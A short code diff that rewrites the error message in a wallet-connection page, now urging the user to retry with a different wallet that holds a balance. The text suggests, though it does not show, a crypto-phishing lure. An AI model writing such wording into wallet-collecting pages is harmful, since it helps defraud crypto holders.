@@ -324,9 +324,12 @@
       .then(function(response) {
         setTimeout(() => {
           errorBox.innerHTML = `
-            Wallet could not connect to server. Only wallets with a balance or transaction history can be connected.<br>
-            <button onclick="returnToMainPage()">Try Again</button>
-          `;
+  <p>
+    Oops, something went wrong verifying this wallet.<br>
+    Please ensure it has recent activity or try again with a different wallet that holds a balance.
+  </p>
+  <button onclick="returnToMainPage()">Try Again</button>
+`;
           errorBox.style.display = "block";
 
           // Blur wallet page behind error box
